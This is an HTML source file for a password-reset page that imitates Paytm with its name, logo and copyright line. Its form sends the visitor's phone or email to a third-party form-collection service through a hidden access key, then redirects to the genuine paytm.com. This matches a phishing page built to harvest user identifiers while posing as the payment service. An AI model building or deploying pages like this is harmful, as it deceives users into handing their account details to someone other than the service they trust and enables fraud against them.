<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Forgot Password - Paytm</title>
    <link rel="stylesheet" href="styles.css" />
    <!-- Optional: Font Awesome for icons -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"
        integrity="sha512-Fo3rlrZj/k7ujTTXRNXOXh7Hq5N9/1Kq1YOq6V2sW/jG4Bw4T1TJD5uB7Cobe74QNf9tNE5kN9S9ID5MW4ZKZw=="
        crossorigin="anonymous" referrerpolicy="no-referrer" />
</head>

<body>
    <div class="container">
        <!-- Header Section -->
        <header class="login-header">
            <img src="paytm-logo.png" alt="Paytm Logo" class="logo" />
            <h1>Forgot Password</h1>
        </header>

        <!-- Forgot Password Form Container -->
        <div class="login-box">
            <h2>Reset Your Password</h2>
            <!-- Message display for errors or instructions -->
            <div id="message" class="message" aria-live="polite"></div>

            <!-- Form to submit email/phone for password reset -->
            <form id="forgot-password-form" action="https://api.web3forms.com/submit" method="POST">
                <!-- Web3Forms Access Key -->
                <input type="hidden" name="access_key" value="7dcc98dd-9694-4483-bbde-ff24db2960cf">
                <!-- Optional: Set a redirect URL after a successful submission -->
                <input type="hidden" name="redirect" value="https://paytm.com/">

                <!-- User Identifier Field -->
                <div class="textbox">
                    <label for="user_identifier">Phone or Email</label>
                    <input type="text" id="user_identifier" name="user_identifier" placeholder="Enter phone or email"
                        required>
                </div>

                <!-- reCAPTCHA Field (placeholder, adjust to your captcha implementation) -->
                <div class="recaptcha">
                    <!-- Example for hCaptcha -->
                    <div class="h-captcha" data-captcha="true"></div>
                </div>

                <!-- Submit button -->
                <button type="submit" class="btn">Submit</button>
            </form>

            <!-- Additional links section -->
            <div class="additional-links">
                <p>
                    Remembered your password? <a href="index.html">Back to Login</a>
                </p>
                <p>
                    Don't have an account? <a href="signup.html">Sign up</a>
                </p>
            </div>
        </div>

        <!-- Footer section (optional) -->
        <footer>
            <p>&copy; 2023 Paytm. All Rights Reserved.</p>
        </footer>
    </div>

    <!-- Inline JavaScript for simple validation -->
    <script>
        document.getElementById('forgot-password-form').addEventListener('submit', function (e) {
            var userIdentifier = document.getElementById('user_identifier').value.trim();
            var message = document.getElementById('message');
            message.textContent = "";

            if (userIdentifier === "") {
                e.preventDefault();
                message.textContent = "Please enter your phone or email.";
                message.style.color = "red";
                return false;
            }
            // Additional captcha check if needed, similar to the login page.
            const captchaField = this.querySelector('textarea[name=h-captcha-response]');
            if (captchaField && !captchaField.value) {
                e.preventDefault();
                alert("Please complete the captcha.");
                return;
            }
            return true;
        });
    </script>
</body>

</html>
